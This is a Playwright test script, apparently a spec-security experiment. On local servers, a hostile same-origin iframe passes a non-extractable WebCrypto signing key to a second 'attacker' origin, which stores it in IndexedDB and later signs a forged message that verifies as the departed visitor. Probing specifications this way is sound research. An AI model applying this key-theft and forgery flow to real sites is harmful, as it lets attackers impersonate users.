// E4: can same-origin hostile code hand a NON-EXTRACTABLE CryptoKey to a different (attacker) origin, which keeps it in ITS OWN IndexedDB and
// can sign with it later, after the victim page/origin is gone?  (WebCrypto Level 2 ED, Security considerations)
import * as pw from '$HOME/Documents/Projects/magnet-web/node_modules/playwright/index.mjs';
import http from 'node:http'; import fs from 'node:fs'; import path from 'node:path';
const engine = process.argv[2];
const root = path.join(process.cwd(), 'pages4');
const mk = () => http.createServer((req, res) => { const u = new URL(req.url, 'http://x'); const p = path.join(root, decodeURIComponent(u.pathname)); if (!fs.existsSync(p) || fs.statSync(p).isDirectory()) { res.writeHead(404).end('nf'); return; } res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' }); fs.createReadStream(p).pipe(res); });
const sA = mk(), sB = mk();
await new Promise((r) => sA.listen(0, '127.0.0.1', r)); await new Promise((r) => sB.listen(0, '127.0.0.1', r));
const A = `http://localhost:${sA.address().port}`, B = `http://127.0.0.1:${sB.address().port}`;
const browser = await pw[engine].launch({ headless: true });
const ctx = await browser.newContext();
const victim = await ctx.newPage(); await victim.goto(A + '/loader.html');
const out = { engine, version: browser.version(), victimOrigin: A, attackerOrigin: B };
out.setup = await victim.evaluate(async () => {
  const pair = await crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, false, ['sign', 'verify']);
  const db = await new Promise((res, rej) => { const q = indexedDB.open('mw-exp4', 1); q.onupgradeneeded = () => q.result.createObjectStore('identity'); q.onsuccess = () => res(q.result); q.onerror = () => rej(q.error); });
  await new Promise((res, rej) => { const tx = db.transaction('identity', 'readwrite'); tx.objectStore('identity').put({ privateKey: pair.privateKey, publicKey: pair.publicKey }, 'me'); tx.oncomplete = res; tx.onerror = () => rej(tx.error); });
  const pub = await crypto.subtle.exportKey('jwk', pair.publicKey);
  window.__pubJwk = pub;
  return { privExtractable: pair.privateKey.extractable, pubJwk: { x: pub.x.slice(0, 8), y: pub.y.slice(0, 8) } };
});
const pubJwk = await victim.evaluate(() => window.__pubJwk);
// hostile same-origin frame hands the key to the attacker origin
out.hostile = await victim.evaluate(async (att) => new Promise((resolve) => {
  const f = document.createElement('iframe'); f.setAttribute('sandbox', 'allow-scripts allow-same-origin'); f.src = '/hostile.html?att=' + encodeURIComponent(att);
  const t = setTimeout(() => resolve({ timeout: true }), 12000);
  addEventListener('message', function h(e) { if (e.data && e.data.kind === 'hostile-result') { clearTimeout(t); removeEventListener('message', h); resolve(e.data.out); } });
  document.body.appendChild(f);
}), B);
// victim page and origin gone: close it. Attacker opens a fresh top-level page at ITS origin only and signs again from its own IDB copy.
await victim.close();
const att = await ctx.newPage(); await att.goto(B + '/attacker.html');
out.later = await att.evaluate(async (pubJwk) => {
  const r = {};
  try {
    const db = await new Promise((res, rej) => { const q = indexedDB.open('stolen', 1); q.onsuccess = () => res(q.result); q.onerror = () => rej(q.error); });
    const key = await new Promise((res, rej) => { const q = db.transaction('k').objectStore('k').get('victim'); q.onsuccess = () => res(q.result); q.onerror = () => rej(q.error); });
    r.keyStillThere = !!key; r.keyExtractable = key && key.extractable;
    const msg = new TextEncoder().encode('forged post signed long after the visitor left');
    const sig = await crypto.subtle.sign({ name: 'ECDSA', hash: 'SHA-256' }, key, msg);
    const pub = await crypto.subtle.importKey('jwk', { kty: 'EC', crv: 'P-256', x: pubJwk.x, y: pubJwk.y }, { name: 'ECDSA', namedCurve: 'P-256' }, true, ['verify']);
    r.verifiesAsVisitor = await crypto.subtle.verify({ name: 'ECDSA', hash: 'SHA-256' }, pub, sig, msg);
    try { await crypto.subtle.exportKey('jwk', key); r.exported = true; } catch (e) { r.exported = false; r.exportErr = e.name; }
  } catch (e) { r.err = e.name + ': ' + String(e.message).slice(0, 120); }
  return r;
}, pubJwk);
console.log(JSON.stringify(out, null, 1));
await browser.close(); sA.close(); sB.close();
